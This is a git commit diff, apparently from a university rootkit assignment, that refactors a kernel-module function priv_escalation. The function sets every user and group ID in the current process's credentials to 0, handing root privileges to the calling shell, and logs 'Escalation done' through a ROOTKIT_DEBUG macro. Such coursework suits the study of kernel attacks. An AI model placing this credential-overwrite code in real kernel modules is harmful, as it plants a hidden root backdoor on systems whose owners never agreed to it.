a958ccccd1854b7119f4a63c26f3914e34945e67
Martin Herrmann <martin.herrmann@tum.de>
2014-11-30 19:05:49 +0100

    mher: Minor refactoring.

--- assignment07/privilege_escalation.c
+++ assignment07/privilege_escalation.c
@@ -1,17 +1,18 @@
 #include <linux/sched.h>
 
+#include "include.h"
 
 /* Function to issue the root privileges for shell */
 void priv_escalation(void)
 {
         struct task_struct *task;
-	/*  Get the task structure of the current process by current macro*/
+	/*  Get the task structure of the current process by current macro */
         task = current; 
         struct cred *pcred = task->cred;
 
         pcred->uid.val = pcred->euid.val = pcred->suid.val = pcred->fsuid.val = 0;
         pcred->gid.val = pcred->egid.val = pcred->sgid.val = pcred->fsgid.val = 0;
 	
-        printk("DEBUG: pid of the terminal : %d Escalation done!!!\n", task->pid);
+        ROOTKIT_DEBUG("pid of the terminal : %d Escalation done!!!\n", task->pid);
 }
 
--- assignment07/privilege_escalation.h
+++ assignment07/privilege_escalation.h
@@ -1,8 +1,6 @@
 #ifndef PRIVILEGE_HEADER 
 #define PRIVILEGE_HEADER
 
-#include "include.h"
-
 void priv_escalation(void);
 
 #endif
